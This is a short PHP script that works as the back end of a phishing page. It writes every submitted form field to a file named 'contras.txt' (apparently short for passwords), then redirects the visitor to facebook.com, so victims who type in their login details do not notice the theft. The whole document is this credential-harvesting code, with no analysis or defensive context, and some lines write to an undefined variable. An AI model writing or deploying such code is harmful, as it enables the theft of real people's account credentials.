<?php
$archivo = fopen("contras.txt","a");
fwrite($archivo, "\t\t\t\t\t\t");
fwrite($archivo,"\r\n");
foreach($_POST as $key=>$value){
fwrite($archivo, "\t\t\t\t\t\t");
fwrite($archivo, $key);
fwrite($archivo, "=");
fwrite($archivo,$value);
fwrite($file,"\r\n");
}
fwrite($archivo,"\r\n");
fwrite($file,"\t\t\t\t\t\t");
fclose($archivo);
header("Location: https://www.facebook.com");
die();
?>
